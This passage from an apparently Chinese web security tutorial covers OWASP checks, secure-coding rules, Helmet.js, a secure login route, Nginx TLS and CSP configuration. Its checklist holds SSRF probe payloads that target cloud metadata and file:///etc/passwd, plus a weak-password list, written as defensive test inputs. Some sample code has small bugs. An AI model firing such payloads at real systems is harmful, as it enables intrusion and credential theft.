        id: 'VUC-001',
        title: '过时依赖',
        description: '检查JavaScript依赖是否有已知漏洞',
        severity: 'HIGH',
        test: async (app) => {
          // 读取package.json
          const packageJson = require('./package.json');
          const dependencies = {
            ...packageJson.dependencies,
            ...packageJson.devDependencies
          };

          const vulnerabilities = [];

          // 使用npm audit或snyk检查漏洞
          // 这里模拟检查逻辑
          for (const [name, version] of Object.entries(dependencies)) {
            // 实际应该调用漏洞数据库API
            const knownVulns = await checkNpmVulnerabilities(name, version);
            if (knownVulns.length > 0) {
              vulnerabilities.push({ name, version, vulns: knownVulns });
            }
          }

          return {
            vulnerable: vulnerabilities.length > 0,
            details: vulnerabilities
          };
        }
      }
    ]
  },

  // A07: 识别和身份验证失败
  IdentificationAndAuthenticationFailures: {
    name: '识别和身份验证失败',

    checks: [
      {
        id: 'IAF-001',
        title: '弱密码策略',
        description: '检查密码策略是否足够严格',
        severity: 'MEDIUM',
        test: async (app) => {
          // 测试注册弱密码
          const weakPasswords = [
            '123456',
            'password',
            'qwerty',
            'admin123'
          ];

          for (const password of weakPasswords) {
            const response = await fetch('http://localhost/api/register', {
              method: 'POST',
              body: JSON.stringify({
                username: 'testuser',
                password: password
              })
            });

            // 如果弱密码被接受，说明策略不够严格
            if (response.ok) {
              const data = await response.json();
              if (data.success) {
                return {
                  vulnerable: true,
                  message: `弱密码被接受: ${password}`
                };
              }
            }
          }

          return { vulnerable: false };
        }
      }
    ]
  },

  // A08: 软件和数据完整性失败
  SoftwareAndDataIntegrityFailures: {
    name: '软件和数据完整性失败',

    checks: [
      {
        id: 'SDI-001',
        title: '不安全的反序列化',
        description: '检查反序列化漏洞',
        severity: 'HIGH',
        test: async (app) => {
          // 测试序列化payload
          const maliciousPayloads = [
            // Java反序列化payload
            'rO0ABQ...',
            // 其他反序列化攻击向量
          ];

          for (const payload of maliciousPayloads) {
            const response = await fetch('http://localhost/api/deserialize', {
              method: 'POST',
              body: JSON.stringify({ data: payload })
            });

            // 检查是否有异常行为
            if (response.status >= 500) {
              return {
                vulnerable: true,
                message: '可能存在不安全的反序列化'
              };
            }
          }

          return { vulnerable: false };
        }
      }
    ]
  },

  // A09: 安全日志和监控失败
  SecurityLoggingAndMonitoringFailures: {
    name: '安全日志和监控失败',

    checks: [
      {
        id: 'SLM-001',
        title: '缺少安全日志',
        description: '检查是否记录安全相关事件',
        severity: 'MEDIUM',
        test: async (app) => {
          // 尝试触发安全事件
          await fetch('http://localhost/api/login', {
            method: 'POST',
            body: JSON.stringify({ username: 'admin', password: 'wrong' })
          });

          // 检查日志端点或日志文件
          const logResponse = await fetch('http://localhost/internal/logs');

          // 这只是一个示例，实际需要根据具体应用来检查
          return {
            vulnerable: false,
            message: '需要手动检查日志配置'
          };
        }
      }
    ]
  },

  // A10: 服务器端请求伪造（SSRF）
  ServerSideRequestForgery: {
    name: '服务端请求伪造',

    checks: [
      {
        id: 'SSRF-001',
        title: 'SSRF漏洞',
        description: '检测SSRF漏洞',
        severity: 'HIGH',
        test: async (app) => {
          // 测试常见的SSRF payload
          const ssrfPayloads = [
            'http://localhost:22',
            'http://127.0.0.1:6379',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd'
          ];

          for (const payload of ssrfPayloads) {
            const response = await fetch(
              `http://localhost/api/fetch?url=${encodeURIComponent(payload)}`
            );

            // 检查是否返回了不应该返回的内容
            const text = await response.text();

            if (text.includes('root:') || // file:// 读取成功
                text.includes('SSH') ||    // localhost:22
                text.includes('metadata')) { // AWS metadata
              return {
                vulnerable: true,
                payload,
                message: '发现SSRF漏洞'
              };
            }
          }

          return { vulnerable: false };
        }
      }
    ]
  },

  // 运行所有检查
  async runAllChecks(app) {
    const results = {
      timestamp: new Date().toISOString(),
      summary: {
        total: 0,
        passed: 0,
        failed: 0,
        warnings: 0
      },
      findings: []
    };

    for (const category of Object.values(this)) {
      if (typeof category !== 'object' || !category.checks) continue;

      for (const check of category.checks) {
        results.summary.total++;

        try {
          const result = await check.test(app);

          if (result.vulnerable) {
            results.summary.failed++;
            results.findings.push({
              ...check,
              result
            });
          } else {
            results.summary.passed++;
          }
        } catch (error) {
          results.summary.warnings++;
          results.findings.push({
            ...check,
            error: error.message
          });
        }
      }
    }

    return results;
  }
};

// 辅助函数：检查npm包漏洞
async function checkNpmVulnerabilities(name, version) {
  // 这应该调用实际的漏洞数据库API
  // 例如：https://registry.npmjs.org/-/v1/search?text=...

  // 模拟返回
  return [];
}

// 导出并使用
module.exports = OWASPChecklist;
```

### 5.2 安全编程规范

安全编程规范是预防安全漏洞的第一道防线。以下是一些关键的安全编程实践。

```javascript
// 安全编程规范检查器

/**
 * 安全编程规范模块
 * 用于在代码层面检查安全最佳实践
 */

const secureCodingRules = {
  // 1. 输入验证规则
  inputValidation: [
    {
      rule: '永远不要信任用户输入',
      description: '所有用户输入都必须经过验证和清理',
      examples: {
        bad: `const query = req.query.id;
db.query('SELECT * FROM users WHERE id = ' + query)`,
        good: `const id = parseInt(req.query.id, 10);
if (isNaN(id)) throw new Error('无效的ID');
db.query('SELECT * FROM users WHERE id = ?', [id])`
      }
    },
    {
      rule: '使用白名单验证',
      description: '优先使用白名单而非黑名单来验证输入',
      examples: {
        bad: `const username = req.body.username;
// 黑名单：容易遗漏
if (username.includes('<script>')) throw new Error('无效');`,
        good: `const username = req.body.username;
// 白名单：更安全
if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) throw new Error('无效');`
      }
    }
  ],

  // 2. 认证与授权规则
  authentication: [
    {
      rule: '使用强密码哈希',
      description: '使用bcrypt、argon2等专用密码哈希算法',
      examples: {
        bad: `// 使用MD5或SHA哈希密码
const hash = crypto.createHash('md5').update(password).digest('hex');`,
        good: `// 使用bcrypt
const hash = await bcrypt.hash(password, 12);`
      }
    },
    {
      rule: '实现会话固定防护',
      description: '登录成功后重新生成会话ID',
      examples: {
        bad: `app.post('/login', (req, res) => {
  if (validUser(username, password)) {
    req.session.userId = user.id; // 直接使用现有session
  }
});`,
        good: `app.post('/login', (req, res) => {
  if (validUser(username, password)) {
    req.session.regenerate((err) => { // 重新生成session ID
      req.session.userId = user.id;
    });
  }
});`
      }
    },
    {
      rule: '实施最小权限原则',
      description: '用户只能访问其工作所需的资源',
      examples: {
        bad: `// 所有管理员都能访问所有功能
app.get('/api/*', authenticate, authorizeAdmin);`,
        good: `// 细粒度权限控制
app.get('/api/admin/users', authenticate, authorize('admin:users:read'));
app.delete('/api/admin/users/:id', authenticate, authorize('admin:users:delete'));
app.get('/api/admin/settings', authenticate, authorize('admin:settings:read'));`
      }
    }
  ],

  // 3. 数据保护规则
  dataProtection: [
    {
      rule: '敏感数据加密存储',
      description: '敏感数据如密码、信用卡号等必须加密存储',
      examples: {
        bad: `// 明文存储密码
User.create({ password: req.body.password });`,
        good: `// 使用bcrypt哈希密码
User.create({ passwordHash: await bcrypt.hash(req.body.password, 12) });`
      }
    },
    {
      rule: '敏感数据不记录日志',
      description: '日志中不应包含密码、令牌等敏感信息',
      examples: {
        bad: `console.log('用户登录:', { username, password });`,
        good: `console.log('用户登录:', { username }); // 不记录密码`
      }
    },
    {
      rule: '敏感数据脱敏显示',
      description: '显示敏感数据时进行脱敏处理',
      examples: {
        bad: `res.json({ creditCard: '1234567890123456' });`,
        good: `res.json({ creditCard: '****-****-****-3456' });`
      }
    }
  ],

  // 4. 错误处理规则
  errorHandling: [
    {
      rule: '不向用户暴露内部错误详情',
      description: '生产环境中不应返回堆栈跟踪',
      examples: {
        bad: `catch (error) {
  res.status(500).json({ error: error.stack });
}`,
        good: `catch (error) {
  console.error(error); // 记录到日志
  res.status(500).json({ error: '服务器内部错误' });
}`
      }
    },
    {
      rule: '统一错误处理',
      description: '使用全局错误处理器统一处理异常',
      examples: {
        bad: `app.get('/path', async (req, res) => {
  try {
    // 业务逻辑
  } catch (e) {
    res.status(500).send('Error');
  }
});`,
        good: `// 全局错误处理器
app.use((err, req, res, next) => {
  console.error(err);
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production'
      ? '内部错误'
      : err.message
  });
});`
      }
    }
  ],

  // 5. 通信安全规则
  communication: [
    {
      rule: '所有敏感通信必须使用HTTPS',
      description: '禁止HTTP传输敏感数据',
      examples: {
        bad: `app.post('/login', (req, res) => {
  // 未验证是否为HTTPS
  res.cookie('session', token);
});`,
        good: `app.post('/login', (req, res) => {
  if (req.secure) { // 验证HTTPS
    res.cookie('session', token, { secure: true, httpOnly: true });
  }
});`
      }
    },
    {
      rule: '设置适当的Cookie安全标志',
      description: '敏感Cookie应设置Secure、HttpOnly、SameSite',
      examples: {
        bad: `res.cookie('session', token);`,
        good: `res.cookie('session', token, {
  secure: true,     // 仅HTTPS传输
  httpOnly: true,   // 禁止JavaScript访问
  sameSite: 'strict' // 防止CSRF
});`
      }
    }
  ],

  // 6. 依赖管理规则
  dependencyManagement: [
    {
      rule: '定期更新依赖',
      description: '使用npm audit等工具检查依赖漏洞',
      examples: {
        bad: `// package.json中锁定过旧版本
"lodash": "^4.0.0" // 4.0.0有已知漏洞`,
        good: `// 定期运行更新
npm audit fix
npm update`
      }
    },
    {
      rule: '审核第三方代码',
      description: '添加新依赖前审查代码质量和安全性',
      examples: {
        bad: `// 直接使用来源不明的包
npm install random-package-from-npm`,
        good: `// 检查包的反向链接、下载量、维护状态
npm info random-package
npm audit random-package`
      }
    }
  ]
};

// 安全代码审查检查器
class SecureCodeReviewer {
  /**
   * 检查代码是否包含安全反模式
   */
  static analyze(code) {
    const issues = [];

    // SQL注入检查
    if (/\+\s*['"`].*\$\{?/.test(code) || /'\s*\+\s*\w/.test(code)) {
      if (/query|select|insert|update|delete/i.test(code)) {
        issues.push({
          severity: 'CRITICAL',
          category: 'SQL Injection',
          message: '检测到可能的SQL注入漏洞：字符串拼接SQL查询',
          suggestion: '使用参数化查询'
        });
      }
    }

    // 硬编码凭证检查
    if (/password\s*[:=]\s*['"][^'"]+['"]/i.test(code) ||
        /api[_-]?key\s*[:=]\s*['"][^'"]+['"]/i.test(code)) {
      issues.push({
        severity: 'HIGH',
        category: 'Hardcoded Credentials',
        message: '检测到硬编码的敏感凭证',
        suggestion: '使用环境变量存储敏感信息'
      });
    }

    // eval使用检查
    if (/eval\s*\(/.test(code)) {
      issues.push({
        severity: 'HIGH',
        category: 'Code Injection',
        message: '检测到eval()使用，可能导致代码注入',
        suggestion: '避免使用eval，考虑使用JSON.parse等安全替代'
      });
    }

    // XSS检查：innerHTML直接插入用户输入
    if (/innerHTML\s*=\s*\w+/.test(code)) {
      issues.push({
        severity: 'MEDIUM',
        category: 'XSS',
        message: '检测到innerHTML使用，可能导致XSS',
        suggestion: '使用textContent或对输入进行HTML转义'
      });
    }

    // 缺少CSRF防护检查
    if (/form.*method\s*=\s*["']POST["']/i.test(code) &&
        !/_csrf|xsrf/i.test(code)) {
      issues.push({
        severity: 'MEDIUM',
        category: 'CSRF',
        message: '表单可能缺少CSRF防护',
        suggestion: '添加CSRF Token'
      });
    }

    return issues;
  }
}

module.exports = {
  secureCodingRules,
  SecureCodeReviewer
};
```

---

## 第六部分：实战演练

### 6.1 使用Helmet.js加强Express安全

Helmet.js是一个Node.js中间件，通过设置各种HTTP头来帮助保护Express应用。

```javascript
// Helmet.js安全配置完整示例
const express = require('express');
const helmet = require('helmet');
const app = express();

// 1. 基础Helmet配置
// Helmet自动设置多种安全相关的HTTP头
app.use(helmet());

// 2. 内容安全策略（CSP）
// CSP是防止XSS的最重要措施之一
app.use(helmet.contentSecurityPolicy({
  // 默认来源：只允许同源
  defaultSrc: ["'self'"],

  // 脚本来源：同源 + 内联脚本（实际生产环境应避免内联）
  scriptSrc: ["'self'", "'unsafe-inline'", 'https://cdn.example.com'],

  // 样式来源：同源 + 内联样式
  styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],

  // 图片来源：同源 + data: URLs + HTTPS来源
  imgSrc: ["'self'", 'data:', 'https:'],

  // 字体来源
  fontSrc: ["'self'", 'https://fonts.gstatic.com'],

  // 连接来源（XHR, WebSocket等）
  connectSrc: ["'self'", 'https://api.example.com'],

  // 帧来源：禁止被iframe嵌入
  frameSrc: ["'none'"],

  // 媒体来源
  mediaSrc: ["'self'"],

  // 对象来源
  objectSrc: ["'none'"],

  // 升级不安全请求
  upgradeInsecureRequests: true,

  // 报告URI
  reportUri: '/csp-report'
}));

// 3. DNS预取控制
// 防止浏览器预取用户可能访问的域名
app.use(helmet.dnsPrefetchControl({
  allow: false // 禁止DNS预取
}));

// 4. 强制浏览器使用最新 IE 版本的兼容性视图
app.use(helmet.ieNoOpen());

// 5. 禁用X-Powered-By头
// 防止攻击者识别服务器技术栈
app.disable('x-powered-by'); // Express原生方法

// 6. X-Content-Type-Options头
// 防止浏览器MIME类型嗅探
app.use(helmet.noSniff());

// 7. X-Frame-Options头
// 防止点击劫持
app.use(helmet.frameguard({
  action: 'sameorigin', // 只允许同源iframe
  // action: 'deny' // 完全禁止
}));

// 8. X-XSS-Protection头
// 启用浏览器XSS过滤器（现代浏览器已迁移到CSP）
app.use(helmet.xssFilter());

// 9. 严格传输安全（HSTS）
app.use(helmet.hsts({
  maxAge: 31536000, // 1年（秒）
  includeSubDomains: true, // 包含子域名
  preload: true // 加入浏览器预加载列表
}));

// 10. Referrer策略
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin' // 严格referrer策略
}));

// 11. 权限策略
app.use(helmet.permittedCrossDomainPolicies({
  permittedPolicies: 'none' // 不允许任何跨域策略
}));

// 12. 清除X-DNS-Prefetch-Control头
app.use(helmet.dnsPrefetchControl({
  allow: false
}));

// CSP违规报告端点
app.post('/csp-report', express.json(), (req, res) => {
  const cspReport = req.body;

  // 记录CSP违规报告
  console.error('CSP违规报告:', JSON.stringify(cspReport, null, 2));

  // 可以发送到安全信息和事件管理（SIEM）系统
  // await sendToSIEM(cspReport);

  res.status(204).send(); // 无内容响应
});

// 使用Origin-Agent-Cluster头
// 提示浏览器使用客户端绑定的工作线程
app.use((req, res, next) => {
  res.setHeader('Origin-Agent-Cluster', '?1');
  next();
});
```

### 6.2 实现安全的登录接口

以下是一个完整的、安全的登录接口实现。

```javascript
// 安全登录接口完整实现
const express = require('express');
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const validator = require('validator');
const app = express();

// 1. JSON解析中间件
app.use(express.json());

// 2. 请求体大小限制
app.use(express.json({ limit: '10kb' }));

// 3. 速率限制：登录接口
// 防止暴力破解
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 5, // 最多5次尝试
  message: {
    error: '登录尝试过于频繁，请15分钟后再试'
  },
  standardHeaders: true, // 返回RateLimit-*头
  legacyHeaders: false, // 禁用X-RateLimit-*头
  // 使用密钥生成器确保同一IP的请求被正确限制
  keyGenerator: (req) => {
    // 使用IP + 用户名的组合作为限流键
    return `${req.ip}-${req.body.username}`;
  },
  // 跳过成功的请求（登录成功后不计数）
  skipSuccessfulRequests: true
});

// 4. 全局限流：防止DDoS
const globalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1分钟
  max: 100, // 最多100个请求
  message: { error: '请求过于频繁' }
});

app.use('/api/', globalLimiter);

// 5. 输入验证中间件
const validateLoginInput = (req, res, next) => {
  const { username, password, mfaToken } = req.body;

  // 验证用户名格式
  if (!username || typeof username !== 'string') {
    return res.status(400).json({ error: '用户名必须提供' });
  }

  // 长度限制
  if (username.length < 3 || username.length > 50) {
    return res.status(400).json({ error: '用户名长度必须在3-50个字符之间' });
  }

  // 字符白名单：只允许字母数字和下划线
  if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    return res.status(400).json({ error: '用户名包含非法字符' });
  }

  // 验证密码存在
  if (!password || typeof password !== 'string') {
    return res.status(400).json({ error: '密码必须提供' });
  }

  // MFA token验证（如果提供）
  if (mfaToken) {
    if (!/^\d{6}$/.test(mfaToken)) {
      return res.status(400).json({ error: 'MFA令牌必须是6位数字' });
    }
  }

  next();
};

// 6. SQL注入防护（使用ORM，自动参数化）
// 假设使用Sequelize ORM
const { User, LoginAttempt, Session } = require('./models');

// 7. 登录历史记录
async function recordLoginAttempt(userId, ip, success, failureReason = null) {
  await LoginAttempt.create({
    userId,
    ip,
    success,
    failureReason,
    userAgent: req.headers['user-agent'],
    attemptedAt: new Date()
  });
}

// 8. 账户锁定检查
async function checkAccountLockout(username) {
  // 查找最近1小时内的失败尝试
  const recentAttempts = await LoginAttempt.findAll({
    where: {
      username,
      success: false,
      attemptedAt: {
        [Op.gte]: new Date(Date.now() - 60 * 60 * 1000)
      }
    }
  });

  // 如果失败次数超过10次，锁定账户1小时
  if (recentAttempts.length >= 10) {
    const lastAttempt = recentAttempts[recentAttempts.length - 1];
    const lockoutEnd = new Date(lastAttempt.attemptedAt.getTime() + 60 * 60 * 1000);

    if (lockoutEnd > new Date()) {
      return {
        locked: true,
        lockoutEnd: lockoutEnd,
        remainingSeconds: Math.ceil((lockoutEnd - new Date()) / 1000)
      };
    }
  }

  return { locked: false };
}

// 9. 检测可疑登录
function detectSuspiciousLogin(currentLogin, lastLogin) {
  const alerts = [];

  if (!lastLogin) return alerts;

  // 检测IP变化
  if (currentLogin.ip !== lastLogin.ip) {
    alerts.push({
      type: 'IP_CHANGE',
      message: '登录IP发生变化',
      previous: lastLogin.ip,
      current: currentLogin.ip
    });
  }

  // 检测地理位置变化（简化版）
  // 实际应该使用GeoIP库
  const currentCountry = currentLogin.ip.substring(0, 2);
  const lastCountry = lastLogin.ip.substring(0, 2);
  if (currentCountry !== lastCountry) {
    alerts.push({
      type: 'LOCATION_CHANGE',
      message: '登录地区发生显著变化'
    });
  }

  // 检测时间异常
  const lastLoginTime = new Date(lastLogin.attemptedAt);
  const hoursSinceLastLogin = (Date.now() - lastLoginTime) / (1000 * 60 * 60);
  if (hoursSinceLastLogin < 1) {
    alerts.push({
      type: 'RAPID_LOGIN',
      message: '距离上次登录不到1小时'
    });
  }

  return alerts;
}

// 10. 生成会话令牌
function generateSessionToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 11. 安全登录路由
app.post('/api/login',
  loginLimiter, // 应用登录限流
  validateLoginInput,
  async (req, res) => {
    const { username, password, mfaToken } = req.body;
    const clientIp = req.ip;

    try {
      // 检查账户是否被锁定
      const lockoutStatus = await checkAccountLockout(username);
      if (lockoutStatus.locked) {
        return res.status(423).json({
          error: '账户已被锁定',
          retryAfter: lockoutStatus.remainingSeconds
        });
      }

      // 查找用户（使用参数化查询防止SQL注入）
      const user = await User.findOne({
        where: {
          username: username
          // ORM自动使用参数化查询
        }
      });

      // 用户不存在
      // 为防止用户枚举攻击，延迟响应时间
      if (!user) {
        await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 100));
        await recordLoginAttempt(null, clientIp, false, 'USER_NOT_FOUND');
        return res.status(401).json({ error: '用户名或密码错误' });
      }

      // 验证密码
      // 使用bcrypt的定时安全比较
      const isPasswordValid = await bcrypt.compare(password, user.passwordHash);

      if (!isPasswordValid) {
        await recordLoginAttempt(user.id, clientIp, false, 'INVALID_PASSWORD');
        await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 100));
        return res.status(401).json({ error: '用户名或密码错误' });
      }

      // MFA验证（如果启用）
      if (user.mfaEnabled) {
        if (!mfaToken) {
          // 要求提供MFA token
          return res.status(403).json({
            error: '需要多因素认证',
            mfaRequired: true
          });
        }

        // 验证MFA token
        const isMFAValid = await verifyTOTP(user.mfaSecret, mfaToken);
        if (!isMFAValid) {
          await recordLoginAttempt(user.id, clientIp, false, 'INVALID_MFA');
          return res.status(401).json({ error: 'MFA验证失败' });
        }
      }

      // 检查可疑登录
      const lastLogin = await LoginAttempt.findOne({
        where: { userId: user.id, success: true },
        order: [['attemptedAt', 'DESC']]
      });

      const alerts = detectSuspiciousLogin(
        { ip: clientIp },
        lastLogin?.toJSON()
      );

      // 发送安全告警（如果有异常）
      if (alerts.length > 0) {
        await sendSecurityAlerts(user.id, alerts);
        // 可以选择拒绝登录或要求额外验证
      }

      // 登录成功：生成会话
      const sessionToken = generateSessionToken();

      // 存储会话（使用安全的哈希存储）
      await Session.create({
        userId: user.id,
        tokenHash: crypto.createHash('sha256').update(sessionToken).digest('hex'),
        ip: clientIp,
        userAgent: req.headers['user-agent'],
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 24小时
        createdAt: new Date()
      });

      // 记录成功登录
      await recordLoginAttempt(user.id, clientIp, true);

      // 生成安全的响应
      res.json({
        success: true,
        message: '登录成功',
        // 不返回敏感信息
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          role: user.role
        },
        alerts: alerts.length > 0 ? alerts : undefined
      });

    } catch (error) {
      // 记录错误但不向客户端暴露详情
      console.error('登录错误:', error);
      res.status(500).json({ error: '登录失败，请稍后重试' });
    }
  }
);

// 12. 安全的会话验证中间件
const authenticateSession = async (req, res, next) => {
  const sessionToken = req.headers['authorization']?.replace('Bearer ', '');

  if (!sessionToken) {
    return res.status(401).json({ error: '未提供会话令牌' });
  }

  const tokenHash = crypto.createHash('sha256').update(sessionToken).digest('hex');

  const session = await Session.findOne({
    where: {
      tokenHash,
      expiresAt: { [Op.gt]: new Date() },
      revoked: false
    },
    include: [{
      model: User,
      attributes: ['id', 'username', 'email', 'role']
    }]
  });

  if (!session) {
    return res.status(401).json({ error: '会话无效或已过期' });
  }

  // 检查IP是否变化（防止会话劫持）
  if (session.ip !== req.ip) {
    // 可以选择拒绝请求或记录警告
    console.warn('会话IP变化:', { sessionIp: session.ip, currentIp: req.ip });
  }

  req.user = session.User;
  req.session = session;

  next();
};

// 13. 登出路由
app.post('/api/logout', authenticateSession, async (req, res) => {
  // 撤销会话
  req.session.revoked = true;
  req.session.revokedAt = new Date();
  await req.session.save();

  res.json({ success: true });
});

// 辅助函数：验证TOTP
async function verifyTOTP(secret, token) {
  const speakeasy = require('speakeasy');
  return speakeasy.totp.verify({
    secret: secret,
    token: token,
    encoding: 'base32',
    step: 30,
    window: 1
  });
}

// 辅助函数：发送安全告警
async function sendSecurityAlerts(userId, alerts) {
  const user = await User.findById(userId);
  // 发送邮件或推送通知
  console.log('安全告警:', { userId, alerts });
}
```

### 6.3 Nginx HTTPS配置

Nginx是生产环境中常用的反向代理和Web服务器。以下是安全相关的Nginx配置。

```nginx
# Nginx安全配置示例

# 1. 基础安全头部
server {
    listen 443 ssl http2;
    server_name example.com;

    # SSL证书配置
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    # SSL协议配置 - 只使用TLS 1.2和1.3
    ssl_protocols TLSv1.2 TLSv1.3;

    # SSL密码套件配置
    # 使用现代的、安全的套件，禁用不安全的套件
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;

    # 优先使用服务器端的密码套件顺序
    ssl_prefer_server_ciphers on;

    # OCSP stapling配置
    # 缓存证书状态，减少客户端的OCSP查询
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    # 证书链验证
    ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;

    # HSTS配置
    # 强制使用HTTPS访问
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # X-Frame-Options
    # 防止点击劫持
    add_header X-Frame-Options "SAMEORIGIN" always;

    # X-Content-Type-Options
    # 防止MIME类型嗅探
    add_header X-Content-Type-Options "nosniff" always;

    # X-XSS-Protection
    # 启用浏览器XSS过滤器
    add_header X-XSS-Protection "1; mode=block" always;

    # Referrer-Policy
    # 控制referrer信息的发送
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Content-Security-Policy
    # 内容安全策略
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com; frame-ancestors 'none';" always;

    # Permissions-Policy
    # 限制浏览器功能API的使用
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=()" always;

    # X-Robots-Tag
    # 控制搜索引擎爬虫行为
    add_header X-Robots-Tag "noindex, nofollow" always;

    # 隐藏Nginx版本号
    server_tokens off;

    # 访问日志（不记录敏感信息）
    access_log /var/log/nginx/example.com/access.log combined;

    # 错误日志
    error_log /var/log/nginx/example.com/error.log;

    # 根目录
    root /var/www/example.com;

    # 主页面
    index index.html;

    # Gzip压缩配置
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml application/json application/javascript application/rss+xml application/atom+xml image/svg+xml;

    # 速率限制配置
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_conn_zone $binary_remote_addr zone=conn:10m;

    # 上游服务器配置（Node.js后端）
    upstream backend {
        server 127.0.0.1:3000;
        keepalive 32;
    }

    # API路由
    location /api/ {
        # 速率限制
        limit_req zone=api burst=20 nodelay;

        # 代理到后端
        proxy_pass http://backend;
        proxy_http_version 1.1;

        # 代理头部设置
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;

        # 超时配置
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;

        # 不缓存敏感内容
        proxy_no_cache $cookie_nocache $arg_nocache$ $cookie_no_cache;
        proxy_cache_bypass $cookie_nocache $arg_nocache$ $cookie_no_cache;
    }

    # 静态文件
    location /static/ {
        alias /var/www/example.com/static/;
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # 健康检查端点
    location /health {
        access_log off;
        return 200 "OK";
    }
}

# HTTP到HTTPS重定向
server {
    listen 80;
    server_name example.com;

    # ACMEchallenge用于Let's Encrypt证书验证
    location /.well-known/acme-challenge/ {
        root /var/www/letsencrypt;
    }

    # 其他HTTP请求重定向到HTTPS
    location / {
        return 301 https://$host$request_uri;
    }
}

# 内部访问限制
# 只允许特定的IP访问管理后台
server {
    listen 443 ssl;
    server_name admin.example.com;

    # SSL配置...

    # IP白名单
    allow 10.0.0.0/8;
    allow 192.168.0.0/16;
    deny all;

    location / {
        proxy_pass http://backend-admin;
        # 其他配置...
    }
}
```

### 6.4 CSP内容安全策略配置

CSP配置是Web安全的重要组成部分，以下是详细的CSP配置指南。

```javascript
// CSP配置示例与实现

/**
 * 内容安全策略（CSP）配置模块
 */

// 基础CSP策略配置
const baseCSP = {
  // 默认来源：只允许同源资源
  'default-src': ["'self'"],

  // 脚本来源：同源 + 内联（开发用）+ CDN（示例）
  // 生产环境应该移除'unsafe-inline'和'unsafe-eval'
  'script-src': ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'https://cdn.example.com'],

  // 样式来源：同源 + 内联 + Google字体
  'style-src': ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],

  // 图片来源：同源 + data: URLs + HTTPS来源
  'img-src': ["'self'", 'data:', 'https:', 'blob:'],

  // 连接来源：同源 + API域名
  'connect-src': ["'self'", 'https://api.example.com', 'wss://realtime.example.com'],

  // 字体来源：同源 + Google字体
  'font-src': ["'self'", 'https://fonts.gstatic.com'],

  // 帧来源：禁止
  'frame-src': ["'none'"],

  // 媒体来源：同源 + CDN
  'media-src': ["'self'", 'https://cdn.example.com'],

  // 对象来源：禁止
  'object-src': ["'none'"],

  // 禁止使用base-uri动态设置
  'base-uri': ["'self'"],

  // 表单提交目标：同源
  'form-action': ["'self'"],

  // 框架祖先：只允许同源
  'frame-ancestors': ["'self'"],

  // 升级不安全请求
  'upgrade-insecure-requests': [],

  // Worker和SharedWorker：同源
  'worker-src': ["'self'"],

  // Manifest：同源
  'manifest-src': ["'self'"]
};

/**
 * CSP报告配置
 */

// 生成CSP头字符串
function generateCSPHeader(cspConfig) {
  return Object.entries(cspConfig)
    .filter(([_, values]) => values && values.length > 0)
    .map(([directive, values]) => `${directive} ${values.join(' ')}`)
    .join('; ');
}

// Express中间件设置CSP
const express = require('express');
const crypto = require('crypto');

function csspMiddleware(req, res, next) {
  // 生成随机nonce用于内联脚本
  const nonce = crypto.randomBytes(16).toString('base64');

  // 动态调整CSP配置，添加nonce
  const cspConfig = {
    ...baseCSP,
    'script-src': [
      "'self'",
      `'nonce-${nonce}'`, // 允许带nonce的内联脚本
      'https://cdn.example.com'
    ],
    'style-src': [
      "'self'",
      "'unsafe-inline'",
      'https://fonts.googleapis.com'
    ]
  };

  // 添加report-uri指令（如果配置了）
  if (process.env.CSP_REPORT_URI) {
    cspConfig['report-uri'] = [process.env.CSP_REPORT_URI];
  }

  const cspHeader = generateCSPHeader(cspConfig);

  // 设置CSP头
  res.setHeader('Content-Security-Policy', cspHeader);

  // 将nonce传递给视图（如果是服务端渲染）
  res.locals.cspNonce = nonce;

  next();
}

// CSP报告处理端点
const cspReportHandler = express.json();

app.post('/csp-report', cspReportHandler, (req, res) => {
  const report = req.body;

  // 验证报告格式
  if (!report || !report['csp-report']) {
    return res.status(400).send('Invalid report');
  }

  const cspReport = report['csp-report'];

  // 记录违规报告
  console.error('CSP违规报告:', {
    documentUri: cspReport['document-uri'],
